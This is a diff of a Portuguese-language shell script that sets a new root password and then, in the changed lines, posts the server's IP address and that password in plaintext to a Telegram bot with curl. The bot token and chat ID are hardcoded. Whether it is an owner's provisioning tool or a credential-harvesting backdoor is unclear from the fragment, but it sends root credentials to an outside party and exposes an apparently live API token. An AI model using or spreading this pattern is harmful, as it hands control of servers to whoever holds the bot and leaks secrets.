@@ -45,9 +45,9 @@ echo -e "$NEW_PASSWORD\n$NEW_PASSWORD" | passwd root
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
 # Formata a mensagem para enviar ao bot do Telegram
-MESSAGE="Senha root definida no servidor.%0%0A$SERVER_IP 🌐.%0ANova senha $NEW_PASSWORD 🔑"
+MESSAGE="Senha root definida no servidor.%0ASeu ip: \`$SERVER_IP\` 🌐%0ANova senha: \`$NEW_PASSWORD\` 🔑"
 
 # Envia a mensagem para o bot do Telegram
 TELEGRAM_BOT_TOKEN="7126941542:AAHVwKISyEOsTgUq9etJxmNHB_v-UHdVhHg"
 CHAT_ID="5149161091"
-curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID&text=$MESSAGE" >/dev/null
+curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID&text=$MESSAGE&parse_mode=Markdown" >/dev/null
